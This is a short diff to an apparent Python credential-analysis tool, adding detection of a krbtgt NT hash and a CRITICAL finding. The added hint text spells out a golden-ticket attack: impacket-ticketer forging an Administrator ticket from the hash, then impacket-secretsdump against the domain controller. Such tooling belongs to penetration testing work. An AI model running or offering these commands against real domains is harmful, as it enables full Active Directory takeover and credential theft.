@@ -1753,6 +1753,27 @@ def analyze(path, report, store=None):
                                            hash=c.nt_hash, hash_mode="1000",
                                            domain=c.domain,
                                            source=path, line=lineno))
+                        # iter-35: krbtgt = golden-ticket primitive. Emit a
+                        # CRITICAL flag + separate kind='krbtgt' Evidence so
+                        # correlate.py R-GOLDEN routes off it.
+                        if c.user.lower() == "krbtgt":
+                            report.add("CRITICAL", "PASSWORD HASHES",
+                                       path, lineno,
+                                       f"krbtgt NT hash: {c.nt_hash}",
+                                       hint=("golden ticket primitive - forge "
+                                             "any user (Administrator): "
+                                             "impacket-ticketer -nthash "
+                                             f"{c.nt_hash} -domain-sid "
+                                             "<S-1-5-21-...> -domain "
+                                             f"{c.domain or '<DOM>'} "
+                                             "Administrator; export "
+                                             "KRB5CCNAME=Administrator.ccache; "
+                                             "impacket-secretsdump -k -no-pass "
+                                             "'<DOM>/Administrator@<DC-FQDN>'"))
+                            store.add(Evidence(kind="krbtgt", user="krbtgt",
+                                               hash=c.nt_hash,
+                                               domain=c.domain,
+                                               source=path, line=lineno))
                     continue
 
                 # ---- pass 2: inline-cred shapes ----
